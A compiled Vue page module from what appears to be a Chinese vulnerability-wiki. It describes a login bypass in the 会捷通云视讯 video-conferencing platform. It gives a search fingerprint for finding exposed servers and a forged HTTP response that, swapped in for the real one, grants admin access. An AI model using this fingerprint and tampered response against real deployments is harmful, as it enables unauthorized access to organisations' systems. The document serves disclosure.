import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>会捷通云视讯存在登陆绕过漏洞，通过拦截特定的请求包并修改即可获取后台权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>会捷通云视讯
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;/him/api/rest/v1.0/node/role&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101858604.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>输入任意账号密码抓包</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101858666.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>修改返回包为如下后放包则成功绕过登录</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>HTTP/1.1 200 
Server: Hsengine/1.4.1
Date: Mon, 17 May 2021 16:13:43 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Accept-Ranges: bytes
Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept
Content-Length: 61

{&quot;token&quot;:null,&quot;result&quot;:null}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101858916.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),s=[d];function r(l,c){return i(),n("div",null,s)}const p=e(t,[["render",r],["__file","会捷通云视讯 登录绕过漏洞.html.vue"]]);export{p as default};
